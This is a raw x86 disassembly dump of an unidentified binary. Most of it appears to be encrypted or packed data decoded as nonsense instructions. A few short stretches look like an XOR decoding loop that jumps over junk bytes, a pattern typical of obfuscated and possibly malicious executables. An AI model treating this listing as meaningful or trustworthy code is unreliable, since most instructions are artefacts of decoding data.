  405d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d8e:	aam    0x16
  405d90:	jbe    0x405d27
  405d92:	ror    DWORD PTR [ebx],cl
  405d94:	adc    DWORD PTR [edi-0x264a6fb8],eax
  405d9a:	ret    0x9bff
  405d9d:	add    ecx,DWORD PTR [ebx-0x5facc060]
  405da3:	jle    0x405df3
  405da5:	stc    
  405da6:	adc    dh,BYTE PTR [eax]
  405da8:	into   
  405da9:	push   ebp
  405daa:	rcr    DWORD PTR [ecx],0xbf
  405dad:	xor    ch,BYTE PTR [esi-0x1e]
  405db0:	add    al,0x61
  405db2:	push   cs
  405db3:	out    dx,al
  405db4:	pop    ebp
  405db5:	fxch   st(5)
  405db7:	test   eax,0x23ec794b
  405dbc:	loope  0x405d50
  405dbe:	mov    WORD PTR [eax-0x7d0c6881],es
  405dc4:	mov    ebp,0x5227a798
  405dc9:	(bad)  
  405dca:	fdiv   QWORD PTR [edx-0x51]
  405dcd:	pop    esp
  405dce:	out    dx,eax
  405dcf:	cwde   
  405dd0:	mov    edi,0xf297e2d5
  405dd5:	rol    BYTE PTR gs:[esi],1
  405dd8:	imul   esp,DWORD PTR [esi+0x19],0xffffffe8
  405ddc:	and    eax,0x3e29d62e
  405de1:	sub    edx,esp
  405de3:	xor    ebx,DWORD PTR [ecx+ebp*2+0x38d274e3]
  405dea:	dec    edx
  405deb:	xchg   ebp,eax
  405dec:	sahf   
  405ded:	xlat   BYTE PTR ds:[ebx]
  405dee:	sub    BYTE PTR [edi-0x6a],0x43
  405df2:	mov    ds:0xbf4fedb4,eax
  405df7:	aad    0x9c
  405df9:	shl    BYTE PTR [edx+0x59],cl
  405dfc:	mov    ?,WORD PTR [eax+0x62ccaea8]
  405e02:	mov    eax,eax
  405e04:	jne    0x405e32
  405e06:	xlat   BYTE PTR ds:[ebx]
  405e07:	or     al,0xa4
  405e09:	fst    DWORD PTR [ebp+edx*1-0x52]
  405e0d:	xor    eax,0xac9233fc
  405e12:	lds    ecx,FWORD PTR [eax-0x525fbdc7]
  405e18:	scas   al,BYTE PTR es:[edi]
  405e19:	pop    ebx
  405e1a:	out    dx,eax
  405e1b:	mov    edx,0x933dccc3
  405e20:	add    DWORD PTR [eax-0x1],esp
  405e23:	xchg   esi,eax
  405e24:	xchg   ah,dh
  405e26:	inc    esi
  405e27:	icebp  
  405e28:	sbb    edx,DWORD PTR [ebp-0x45]
  405e2b:	add    DWORD PTR [eax-0x63],edi
  405e2e:	mov    esi,0x91d31612
  405e33:	inc    esi
  405e34:	popf   
  405e35:	mov    WORD PTR [ebp+eax*1-0xc921aca],fs
  405e3c:	bound  ebp,QWORD PTR [ecx+0x14]
  405e3f:	mov    esi,0x953b045d
  405e44:	jl     0x405e8f
  405e46:	shl    esi,0xd9
  405e49:	sbb    DWORD PTR [ecx-0x7f3560c5],eax
  405e4f:	pop    ecx
  405e50:	shl    DWORD PTR [ebp+0x43d0d5d],0xcb
  405e57:	scas   eax,DWORD PTR es:[edi]
  405e58:	dec    ebx
  405e59:	jb     0x405e1b
  405e5b:	or     eax,0x91a96941
  405e60:	icebp  
  405e61:	loopne 0x405e9a
  405e63:	repz adc esp,edx
  405e66:	or     DWORD PTR [ecx+edi*1],esp
  405e69:	test   DWORD PTR [esi+0x6d],esp
  405e6c:	mov    ah,0x3a
  405e6e:	in     eax,0x70
  405e70:	jns    0x405e32
  405e72:	mov    al,0x70
  405e74:	jnp    0x405e59
  405e76:	lods   al,BYTE PTR ds:[esi]
  405e77:	in     eax,dx
  405e78:	enter  0x2236,0x3b
  405e7c:	sbb    bl,dl
  405e7e:	jmp    0x4be7834
  405e83:	jae    0x405e1e
  405e85:	or     BYTE PTR [ebp-0x35d6a8eb],ah
  405e8b:	mov    ds:0xe1a7034a,al
  405e90:	jbe    0x405eb9
  405e92:	popa   
  405e93:	cs sbb eax,0x3391cd94
  405e99:	ds ror esp,cl
  405e9c:	iret   
  405e9d:	sbb    DWORD PTR ds:0xbdf5e457,edi
  405ea3:	out    dx,eax
  405ea4:	xchg   ecx,eax
  405ea5:	retf   
  405ea6:	or     al,0x56
  405ea8:	push   cs
  405ea9:	xchg   ebx,eax
  405eaa:	and    ebx,DWORD PTR [ecx+0x23]
  405ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eae:	sub    ebx,DWORD PTR [ebx+0x8]
  405eb1:	and    esi,ebx
  405eb3:	mov    ah,0x9f
  405eb5:	push   eax
  405eb6:	icebp  
  405eb7:	sub    BYTE PTR [esi-0x504704de],al
  405ebd:	xchg   ecx,eax
  405ebe:	stc    
  405ebf:	xchg   ebp,eax
  405ec0:	xchg   edi,eax
  405ec1:	stc    
  405ec2:	mov    ds:0x1025e3fd,al
  405ec7:	ja     0x405f01
  405ec9:	add    al,0x84
  405ecb:	test   al,0x2c
  405ecd:	bound  ecx,QWORD PTR [edi-0x8653be0]
  405ed3:	dec    ecx
  405ed4:	aas    
  405ed5:	xchg   edx,eax
  405ed6:	leave  
  405ed7:	xchg   esp,eax
  405ed8:	aaa    
  405ed9:	leave  
  405eda:	xor    al,al
  405edc:	xor    edx,DWORD PTR [ecx+edx*1]
  405edf:	lea    esp,[esi+edi*8+0x41]
  405ee3:	shl    ah,1
  405ee5:	test   DWORD PTR [ebx-0x2c0821fe],esi
  405eeb:	shrd   DWORD PTR [edx-0x2e],esi,cl
  405eef:	xchg   edx,eax
  405ef0:	jo     0x405f30
  405ef2:	addr16 or al,0xca
  405ef5:	fild   DWORD PTR [eax]
  405ef7:	dec    edx
  405ef8:	pop    es
  405ef9:	adc    edx,ecx
  405efb:	xor    cl,BYTE PTR [edi-0x47]
  405efe:	jg     0x405eaf
  405f00:	in     al,0x70
  405f02:	xchg   ecx,eax
  405f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f04:	cmp    esp,DWORD PTR [ebp+0x15]
  405f07:	shl    DWORD PTR [edi],0xb4
  405f0a:	out    0xeb,eax
  405f0c:	daa    
  405f0d:	or     ebx,DWORD PTR [edx+0x5a]
  405f10:	mov    eax,0x6b2efe07
  405f15:	fidivr WORD PTR [eax]
  405f17:	mov    ch,0x30
  405f19:	cdq    
  405f1a:	fistp  WORD PTR [edi+0x51]
  405f1d:	xor    esi,0x9468410a
  405f23:	and    BYTE PTR [eax],bl
  405f25:	xchg   ecx,eax
  405f26:	xchg   edx,eax
  405f27:	aam    0x1c
  405f29:	cdq    
  405f2a:	not    DWORD PTR [ebp+eax*2+0x5f]
  405f2e:	lods   al,BYTE PTR ds:[esi]
  405f2f:	cmp    dh,bh
  405f31:	in     eax,0x62
  405f33:	lahf   
  405f34:	pop    edx
  405f35:	and    eax,esp
  405f37:	jmp    0x314a:0x628e7dd2
  405f3e:	jecxz  0x405fa8
  405f40:	pop    ss
  405f41:	stos   DWORD PTR es:[edi],eax
  405f42:	cmp    eax,0xe9e35c17
  405f47:	loop   0x405f6e
  405f49:	xchg   esp,eax
  405f4a:	stos   BYTE PTR es:[edi],al
  405f4b:	mov    ds:0x6aa83d5e,eax
  405f50:	ds pop edi
  405f52:	inc    bl
  405f54:	xchg   bh,dh
  405f56:	hlt    
  405f57:	out    dx,al
  405f58:	cmp    ebp,edi
  405f5a:	fs mov dl,0xfa
  405f5d:	add    BYTE PTR [edx],0xfc
  405f60:	int    0x2d
  405f62:	jge    0x405fbb
  405f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f65:	ret    
  405f66:	jns    0x405f10
  405f68:	sub    edx,edx
  405f6a:	pop    edi
  405f6b:	jmp    0xe6e39776
  405f70:	adc    al,0x57
  405f72:	(bad)  
  405f73:	aas    
  405f74:	pushf  
  405f75:	lods   al,BYTE PTR ds:[esi]
  405f76:	imul   ebx,DWORD PTR [edx-0x5d546e2a],0xeed4fdfa
  405f80:	imul   esp,ebx,0xffffffa3
  405f83:	mov    ecx,0xd203515b
  405f88:	or     DWORD PTR [esi-0x7d],esp
  405f8b:	fbld   TBYTE PTR [esi]
  405f8d:	add    ecx,0x20
  405f90:	repnz mov eax,0x434ed7c6
  405f96:	inc    ebp
  405f97:	outs   dx,BYTE PTR ds:[esi]
  405f98:	xchg   ecx,eax
  405f99:	les    edi,FWORD PTR [ebx]
  405f9b:	or     DWORD PTR [edi+0x50],eax
  405f9e:	sub    DWORD PTR [esp+eiz*2],ecx
  405fa1:	lods   al,BYTE PTR ds:[esi]
  405fa2:	push   ds
  405fa3:	out    dx,eax
  405fa4:	push   ebx
  405fa5:	xchg   ebp,eax
  405fa6:	dec    ebp
  405fa7:	fistp  WORD PTR [esi-0x726172f2]
  405fad:	mov    bh,0x8
  405faf:	push   ss
  405fb0:	mov    esi,DWORD PTR ds:0x1cc87dd0
  405fb6:	pop    esp
  405fb7:	dec    edi
  405fb8:	imul   ecx,DWORD PTR [esi-0x49c4e719],0x7eace3a7
  405fc2:	sbb    ebx,eax
  405fc4:	ret    
  405fc5:	fist   DWORD PTR [ebp+0x16]
  405fc8:	xchg   esi,eax
  405fc9:	mov    WORD PTR [ecx-0x5dea4423],ds
  405fcf:	adc    bl,bl
  405fd1:	pop    ebp
  405fd2:	into   
  405fd3:	inc    esp
  405fd4:	sbb    ah,BYTE PTR ds:0x86108e10
  405fda:	(bad)  [edi]
  405fdc:	fild   WORD PTR [eax+0x1b]
  405fdf:	popa   
  405fe0:	push   esi
  405fe1:	and    BYTE PTR [esp+esi*2],0x94
  405fe5:	or     bl,bh
  405fe7:	jle    0x405f72
  405fe9:	mov    cl,0xa5
  405feb:	ret    0xd500
  405fee:	and    al,0x5b
  405ff0:	gs ror ah,0x4e
  405ff4:	fcom   QWORD PTR [ebp+0x4dfb2245]
  405ffa:	push   eax
  405ffb:	add    al,0xb4
  405ffd:	cwde   
  405ffe:	jo     0x406001
  406000:	and    ah,cl
  406002:	xchg   ebp,eax
  406003:	dec    ecx
  406004:	pop    ecx
  406005:	sbb    eax,0xee2eaa54
  40600a:	jne    0x40604a
  40600c:	inc    edi
  40600d:	shl    BYTE PTR [edi+0x66557bf1],0x17
  406014:	cmp    edx,DWORD PTR [edi+0x52]
  406017:	sub    ebx,esi
  406019:	lea    eax,[esi+0x78]
  40601c:	shl    BYTE PTR [esi+0x7b],cl
  40601f:	mov    dh,0x4f
  406021:	fcom   QWORD PTR [edx+0x43]
  406024:	shr    DWORD PTR [ebx],1
  406026:	mov    esi,0x9e494ece
  40602b:	fucom  st(0)
  40602d:	jp     0x406052
  40602f:	sbb    DWORD PTR [ecx+0x7b113b06],esp
  406035:	jae    0x4060b6
  406037:	ror    DWORD PTR [ecx+0x36e3d603],1
  40603d:	push   ecx
  40603e:	shr    dh,1
  406040:	lds    esp,FWORD PTR [ecx-0x67f90c9b]
  406046:	fcomp  QWORD PTR [edi-0x205c5120]
  40604c:	sbb    BYTE PTR [edx],dl
  40604e:	jmp    0x74a4:0x69de5eef
  406055:	imul   edx,DWORD PTR [ebx],0x54
  406058:	push   0xffffffb9
  40605a:	and    eax,0x8e59b007
  40605f:	push   ebx
  406060:	aas    
  406061:	in     al,dx
  406062:	jne    0x4060e3
  406064:	mov    WORD PTR [esi+eax*1+0x41eec8bb],?
  40606b:	ficomp WORD PTR [ecx-0x64fb4ea8]
  406071:	shl    BYTE PTR ds:0x31be80fc,0x63
  406078:	xor    ah,BYTE PTR [eax-0x36]
  40607b:	jmp    0xbd7a:0x15e681fb
  406082:	out    0x1f,eax
  406084:	jle    0x40604c
  406086:	outs   dx,BYTE PTR ds:[esi]
  406087:	add    eax,0x6608287c
  40608c:	add    eax,0xf89a2913
  406091:	rcr    BYTE PTR [ebx+ecx*4],cl
  406094:	(bad)  
  406095:	push   ebx
  406096:	add    eax,0xb80accbe
  40609b:	fidiv  DWORD PTR [ecx+0x7c]
  40609e:	xor    dl,BYTE PTR [ecx]
  4060a0:	and    ebp,DWORD PTR [ecx+ebx*1-0x48]
  4060a4:	ss aad 0x47
  4060a7:	es int3 
  4060a9:	rcr    cl,1
  4060ab:	into   
  4060ac:	cmp    edi,ecx
  4060ae:	not    dh
  4060b0:	femms  
  4060b2:	dec    ebx
  4060b3:	pushf  
  4060b4:	and    DWORD PTR [edi-0x67],edi
  4060b7:	dec    esi
  4060b8:	(bad)  
  4060b9:	mov    dl,0x86
  4060bb:	mov    ah,0x89
  4060bd:	bnd jb 0x4060b7
  4060c0:	and    bl,cl
  4060c2:	adc    BYTE PTR [edx],0xd2
  4060c5:	xor    cl,BYTE PTR [ebx]
  4060c7:	mov    bl,0x44
  4060c9:	cdq    
  4060ca:	ss lahf 
  4060cc:	push   ebp
  4060cd:	pop    es
  4060ce:	cmp    al,0x5d
  4060d0:	imul   esi,edx,0xffffff91
  4060d3:	mov    bh,BYTE PTR [ebp-0x510bcdce]
  4060d9:	in     al,0xfd
  4060db:	addr16 loopne 0x4060a5
  4060de:	push   ebx
  4060df:	and    BYTE PTR [ebp-0x71],cl
  4060e2:	cmp    BYTE PTR [ecx],0xa1
  4060e5:	js     0x4060ab
  4060e7:	jb     0x40610d
  4060e9:	push   edi
  4060ea:	xchg   esp,eax
  4060eb:	dec    eax
  4060ec:	dec    esi
  4060ed:	or     al,0x50
  4060ef:	cmp    ebp,0x45
  4060f2:	in     al,0xab
  4060f4:	or     BYTE PTR ds:0x5448d16,dh
  4060fa:	cld    
  4060fb:	mov    DWORD PTR [ebp-0x34],eax
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	inc    edx
  40612d:	mov    ebp,ecx
  40612f:	jo     0x4061a9
  406131:	mov    ds:0x129e1818,eax
  406136:	sbb    BYTE PTR [eax],bl
  406138:	push   ss
  406139:	sahf   
  40613a:	fidiv  DWORD PTR [eax]
  40613c:	cmp    ecx,0x1c
  40613f:	push   cs
  406140:	inc    ecx
  406141:	call   0x4b71ad3e
  406146:	imul   ebp,DWORD PTR ds:0x708ab4ef,0xffef596b
  406150:	jmp    0x5d43:0x9220f1d7
  406157:	mov    eax,ds:0xbff7a106
  40615c:	push   0x6fb34e86
  406161:	out    dx,eax
  406162:	cdq    
  406163:	or     eax,DWORD PTR [eax+ecx*8+0x167528a0]
  40616a:	rcr    dh,cl
  40616c:	mov    al,ds:0xec003fff
  406171:	pop    ebp
  406172:	cdq    
  406173:	push   ebx
  406174:	add    DWORD PTR [eax+0x32],ebx
  406177:	fidiv  WORD PTR [ebp+esi*1-0x1c8d6a5e]
  40617e:	mov    ds:0x5e6a52d2,eax
  406183:	sbb    BYTE PTR [eax],bl
  406185:	cmp    DWORD PTR [edx+ebx*1-0x10fd825a],edi
  40618c:	lods   eax,DWORD PTR ds:[esi]
  40618d:	cdq    
  40618e:	push   eax
  40618f:	dec    edx
  406190:	mov    ch,0x5f
  406192:	dec    ecx
  406193:	sub    eax,0xf3aafb8c
  406198:	test   ebp,esi
  40619a:	mov    ebx,gs
  40619c:	adc    BYTE PTR [ecx+ebp*2+0x3fb6f506],ch
  4061a3:	sub    dl,BYTE PTR [edi]
  4061a5:	xor    al,0x5d
  4061a7:	pop    esi
  4061a8:	jns    0x40619a
  4061aa:	push   eax
  4061ab:	sub    eax,0x5e1f1fb4
  4061b0:	sbb    eax,0xaf74ad7d
  4061b5:	ja     0x406216
  4061b7:	xchg   esp,eax
  4061b8:	fld    QWORD PTR [ebx-0xa]
  4061bb:	loope  0x406165
  4061bd:	out    dx,al
  4061be:	pop    edx
  4061bf:	fidivr DWORD PTR [edx]
  4061c1:	sbb    ch,bl
  4061c3:	jbe    0x4061cd
  4061c5:	inc    esp
  4061c6:	sbb    esi,DWORD PTR [esi-0x6cb8ace]
  4061cc:	inc    ebp
  4061cd:	sbb    eax,0x2a43ea5c
  4061d2:	dec    edx
  4061d3:	push   0x77
  4061d5:	push   ecx
  4061d6:	cmp    eax,0x94c4d94b
  4061db:	in     eax,0x38
  4061dd:	push   0xfb69511c
  4061e2:	jle    0x406182
  4061e4:	add    eax,0x8a15299c
  4061e9:	icebp  
  4061ea:	test   eax,0xaa9f93c0
  4061ef:	push   ss
  4061f0:	mov    ebp,0x29a0b003
  4061f5:	adc    DWORD PTR [esi-0x7e],edx
  4061f8:	ret    0x97ea
  4061fb:	push   eax
  4061fc:	in     eax,0x8b
  4061fe:	mov    BYTE PTR [eax+eiz*2],al
  406201:	imul   ebx,DWORD PTR [eax-0x6785e0e4],0xfef30ddc
  40620b:	mov    esi,0xfb6366bf
  406210:	xlat   BYTE PTR ds:[ebx]
  406211:	sahf   
  406212:	jmp    0x13d801d7
  406217:	dec    esi
  406218:	push   ds
  406219:	ins    DWORD PTR es:[edi],dx
  40621a:	jle    0x406288
  40621c:	mov    dl,0x62
  40621e:	ret    
  40621f:	mov    bh,0xa6
  406221:	(bad)  
  406222:	je     0x4061a4
  406224:	icebp  
  406225:	mov    esi,0xa56b6522
  40622a:	shl    ebp,1
  40622c:	xchg   DWORD PTR [esi],eax
  40622e:	adc    ch,al
  406230:	sti    
  406231:	add    DWORD PTR [ebp-0x7478658b],edx
  406237:	mov    bh,0xc5
  406239:	mov    ebx,0x26e28e5e
  40623e:	sub    edx,0x4b
  406241:	scas   al,BYTE PTR es:[edi]
  406242:	std    
  406243:	fsubr  DWORD PTR [edx-0x25]
  406246:	lock (bad) 
  406248:	push   0xffffffec
  40624a:	loope  0x406296
  40624c:	test   DWORD PTR [ebx+0x60],esi
  40624f:	xor    BYTE PTR [esi-0x151c8a08],dl
  406255:	shr    DWORD PTR [edx-0x2d],1
  406258:	loope  0x406228
  40625a:	inc    ebx
  40625b:	mov    WORD PTR [ecx-0x59c7bda],fs
  406261:	jmp    0x8ab25722
  406266:	out    dx,eax
  406267:	aas    
  406268:	fbld   TBYTE PTR [ebx-0x4af5387a]
  40626e:	cmp    DWORD PTR [ecx-0x48c16fcf],0x58
  406275:	dec    esi
  406276:	inc    edi
  406277:	idiv   esp
  406279:	sub    dh,BYTE PTR [ebx]
  40627b:	ss fwait
  40627d:	js     0x406230
  40627f:	pop    edi
  406280:	mov    al,ds:0x515b15a
  406285:	les    esp,FWORD PTR [ecx+0x55]
  406288:	std    
  406289:	mov    ds:0xe5b7b298,eax
  40628e:	not    DWORD PTR [ecx]
  406290:	pushf  
  406291:	retf   0x7c66
  406294:	xchg   ebp,eax
  406295:	jae    0x4062a0
  406297:	(bad)  
  406298:	loopne 0x406249
  40629a:	idiv   DWORD PTR [ecx]
  40629c:	push   es
  40629d:	or     ebx,DWORD PTR [ecx-0x13]
  4062a0:	or     ebp,esp
  4062a2:	sub    ebp,DWORD PTR [esi+0x6a]
  4062a5:	pop    ecx
  4062a6:	outs   dx,BYTE PTR ds:[esi]
  4062a7:	test   bh,al
  4062a9:	in     al,0xf3
  4062ab:	inc    edi
  4062ac:	dec    eax
  4062ad:	jnp    0x4062e8
  4062af:	push   0xffffffef
  4062b1:	push   ss
  4062b2:	cmc    
  4062b3:	dec    esi
  4062b4:	hlt    
  4062b5:	adc    DWORD PTR [eax+0x49d60f11],0x6df41118
  4062bf:	jmp    0x36f6:0xb3ee207f
  4062c6:	ins    DWORD PTR es:[edi],dx
  4062c7:	sbb    esi,eax
  4062c9:	xchg   ecx,eax
  4062ca:	inc    eax
  4062cb:	mov    ecx,0x36fe35d1
  4062d0:	adc    eax,0x26319110
  4062d5:	(bad)  
  4062d6:	xchg   esi,eax
  4062d7:	ja     0x406277
  4062d9:	(bad)  
  4062da:	adc    dh,ah
  4062dc:	es pop ebp
  4062de:	jb     0x406337
  4062e0:	xlat   BYTE PTR ds:[ebx]
  4062e1:	push   es
  4062e2:	cli    
  4062e3:	shl    ch,0xf8
  4062e6:	push   ds
  4062e7:	enter  0x6250,0xe4
  4062eb:	lahf   
  4062ec:	jnp    0x406288
  4062ee:	dec    ecx
  4062ef:	mov    DWORD PTR [eax+0x22],esi
  4062f2:	or     ebp,0xffffffff
  4062f5:	sbb    edi,edx
  4062f7:	fwait
  4062f8:	push   ds
  4062f9:	jae    0x4062e8
  4062fb:	jnp    0x4062bb
  4062fd:	sub    BYTE PTR [ebx+0x22],ah
  406300:	or     DWORD PTR [esi],0x2fcf1d56
  406306:	mov    BYTE PTR ds:0x2a47b422,ah
  40630c:	into   
  40630d:	push   ss
  40630e:	sub    al,0x72
  406310:	fstp   DWORD PTR [edi-0x74]
  406313:	lods   al,BYTE PTR ds:[esi]
  406314:	repnz push ecx
  406316:	jbe    0x40636b
  406318:	(bad)  
  406319:	in     eax,dx
  40631a:	fadd   DWORD PTR [ecx-0x6b]
  40631d:	mov    DWORD PTR [eax],0xb8df3103
  406323:	ror    DWORD PTR [ecx-0x45e944d4],1
  406329:	mov    ah,0x78
  40632b:	xchg   edx,eax
  40632c:	fidiv  DWORD PTR [esi+0x56588f8a]
  406332:	clc    
  406333:	lods   al,BYTE PTR ds:[esi]
  406334:	popa   
  406335:	aaa    
  406336:	pop    ds
  406337:	cmp    DWORD PTR [esi-0x58958555],ebp
  40633d:	cmp    esp,DWORD PTR ds:0x6372d755
  406343:	nop
  406344:	adc    DWORD PTR [esi],esi
  406346:	mov    esi,0x572b750d
  40634b:	out    0x7c,al
  40634d:	jns    0x4062e4
  40634f:	dec    esi
  406350:	mul    DWORD PTR [ecx-0x7e]
  406353:	out    dx,eax
  406354:	push   eax
  406355:	dec    esp
  406356:	and    ecx,0x997b0f75
  40635c:	inc    ebp
  40635d:	rcl    BYTE PTR [ebp-0x65261f9],cl
  406363:	ret    0x42b2
  406366:	and    bl,BYTE PTR [ebp-0xe]
  406369:	cdq    
  40636a:	xchg   edx,eax
  40636b:	(bad)  
  40636c:	retf   
  40636d:	sti    
  40636e:	es addr16 adc eax,0x65999a41
  406375:	fwait
  406376:	popa   
  406377:	dec    edx
  406378:	sub    BYTE PTR [eax-0x41be2d0f],cl
  40637e:	lods   eax,DWORD PTR ds:[esi]
  40637f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406380:	fild   WORD PTR [edx+eax*8-0x25]
  406384:	pop    ss
  406385:	mov    ds:0xf2375aea,eax
  40638a:	stos   DWORD PTR es:[edi],eax
  40638b:	push   ss
  40638c:	add    al,0xab
  40638e:	and    al,0x43
  406390:	clc    
  406391:	jle    0x406370
  406393:	mov    DWORD PTR [edi-0x4e],edi
  406396:	out    0xd3,eax
  406398:	call   DWORD PTR ds:0x752b019b
  40639e:	pop    esi
  40639f:	ret    
  4063a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063a1:	mov    BYTE PTR [edi+0x7aa44f06],bl
  4063a7:	cmc    
  4063a8:	xchg   esi,eax
  4063a9:	xor    eax,0xc1d37a77
  4063ae:	xchg   ebx,eax
  4063af:	jle    0x40641f
  4063b1:	push   esp
  4063b2:	mov    ch,bh
  4063b4:	aam    0xa1
  4063b6:	clc    
  4063b7:	stos   BYTE PTR es:[edi],al
  4063b8:	fmul   st,st(4)
  4063ba:	cdq    
  4063bb:	ror    BYTE PTR [eax],1
  4063bd:	ins    BYTE PTR es:[edi],dx
  4063be:	fs inc ecx
  4063c0:	push   cs
  4063c1:	or     esi,DWORD PTR [edi+0x3b68c776]
  4063c7:	sbb    BYTE PTR [esi],0x35
  4063ca:	(bad)  
  4063cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063cc:	loopne 0x406407
  4063ce:	xor    DWORD PTR [ecx+0x2d],eax
  4063d1:	xchg   ebx,eax
  4063d2:	(bad)  
  4063d3:	jno    0x406444
  4063d5:	int    0x64
  4063d7:	xchg   esp,eax
  4063d8:	scas   al,BYTE PTR es:[edi]
  4063d9:	pop    ebp
  4063da:	in     al,0x7c
  4063dc:	arpl   WORD PTR [ebx],cx
  4063de:	fcmovnbe st,st(6)
  4063e0:	inc    esi
  4063e1:	sub    al,0x6b
  4063e3:	dec    eax
  4063e4:	mov    edx,0x7106a0b3
  4063e9:	stos   DWORD PTR es:[edi],eax
  4063ea:	xor    al,ch
  4063ec:	test   al,0xf1
  4063ee:	jne    0x406401
  4063f0:	rcr    al,0x27
  4063f3:	mov    es,WORD PTR [ebp+0x67]
  4063f6:	ds ror cl,0x82
  4063fa:	test   al,0xec
  4063fc:	aad    0x89
  4063fe:	inc    edx
  4063ff:	cli    
  406400:	xor    ebx,ebx
  406402:	xchg   ebp,eax
  406403:	(bad)  
  406404:	std    
  406405:	mov    dh,BYTE PTR [edi-0x11]
  406408:	mov    ds:0xd0756e7d,eax
  40640d:	shl    al,1
  40640f:	cmp    eax,ebp
  406411:	jnp    0x406468
  406413:	test   al,0xad
  406415:	fimul  DWORD PTR [edi+0x4503919]
  40641b:	push   ecx
  40641c:	and    al,0x1c
  40641e:	mov    bl,0x86
  406420:	mov    ebp,0x3b6f2f70
  406425:	test   BYTE PTR [eax],ah
  406427:	ror    ebx,cl
  406429:	xchg   DWORD PTR [ebp+0x6e8581d2],ebp
  40642f:	jecxz  0x406425
  406431:	rcr    bl,0x14
  406434:	not    DWORD PTR [edi]
  406436:	sti    
  406437:	fdiv   QWORD PTR [eax+0x119d0598]
  40643d:	mov    dl,0xd2
  40643f:	pop    esi
  406440:	inc    ebx
  406441:	ja     0x4064b2
  406443:	ja     0x406490
  406445:	adc    dh,dl
  406447:	inc    edi
  406448:	fldcw  WORD PTR [esi-0x12a9c474]
  40644e:	xchg   edx,eax
  40644f:	idiv   DWORD PTR [eax-0x730cb2a7]
  406455:	xor    DWORD PTR [esi+0x2903b1b1],edx
  40645b:	pop    edx
  40645c:	nop
  40645d:	mov    al,0xf9
  40645f:	push   edx
  406460:	xchg   BYTE PTR [eax-0x1cc5da1b],ch
  406466:	daa    
  406467:	aam    0xf8
  406469:	xchg   edi,eax
  40646a:	scas   al,BYTE PTR es:[edi]
  40646b:	outs   dx,DWORD PTR ds:[esi]
  40646c:	mov    bh,BYTE PTR [edi]
  40646e:	in     al,dx
  40646f:	xor    dl,dh
  406471:	inc    edx
  406472:	inc    ecx
  406473:	rol    DWORD PTR [edi],0xb1
  406476:	xor    al,0x6
  406478:	or     eax,0x71982e87
  40647d:	mov    cl,0xf4
  40647f:	adc    eax,0x71090196
  406484:	and    dh,0x73
  406487:	outs   dx,DWORD PTR ds:[esi]
  406488:	and    eax,0x61851426
  40648d:	les    esp,FWORD PTR [edx+0x1b]
  406490:	xchg   esi,eax
  406491:	test   al,0xf1
  406493:	mov    ah,0x10
  406495:	inc    edx
  406496:	test   BYTE PTR [ecx-0x6221a485],bl
  40649c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40649d:	(bad)  
  40649e:	(bad)  
  40649f:	jmp    0x1756:0x97aedeed
  4064a6:	cwde   
  4064a7:	add    edx,DWORD PTR [esi-0x11]
  4064aa:	or     dl,bh
  4064ac:	and    al,0x44
  4064ae:	jnp    0x406467
  4064b0:	add    dl,BYTE PTR [ecx]
  4064b2:	dec    ebx
  4064b3:	out    0x24,eax
  4064b5:	and    al,BYTE PTR [edi]
  4064b7:	push   0x6eacc8cd
  4064bc:	sbb    ebp,DWORD PTR [edi+0x1cdaa423]
  4064c2:	into   
  4064c3:	gs aam 0xf5
  4064c6:	inc    ecx
  4064c7:	cmp    al,0x6a
  4064c9:	outs   dx,BYTE PTR ds:[esi]
  4064ca:	test   esp,ebp
  4064cc:	adc    al,0x88
  4064ce:	dec    ebx
  4064cf:	xor    BYTE PTR [edx-0xf],ah
  4064d2:	shl    esp,0xa4
  4064d5:	mov    eax,0x1f6897ef
  4064da:	test   eax,0x7a74f46b
  4064df:	into   
  4064e0:	jge    0x406497
  4064e2:	and    DWORD PTR [edx],0x70
  4064e5:	in     eax,dx
  4064e6:	retf   0x5d0f
  4064e9:	dec    esi
  4064ea:	fisub  WORD PTR [ebp-0x1c]
  4064ed:	push   es
  4064ee:	neg    BYTE PTR [ebp-0x7ca2600b]
  4064f4:	dec    eax
  4064f5:	std    
  4064f6:	mov    WORD PTR [edi],?
  4064f8:	push   esi
  4064f9:	or     eax,edx
  4064fb:	mov    cl,BYTE PTR [eax+ecx*1]
  4064fe:	mov    eax,DWORD PTR [ebp-0x34]
  406501:	xor    BYTE PTR [eax],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
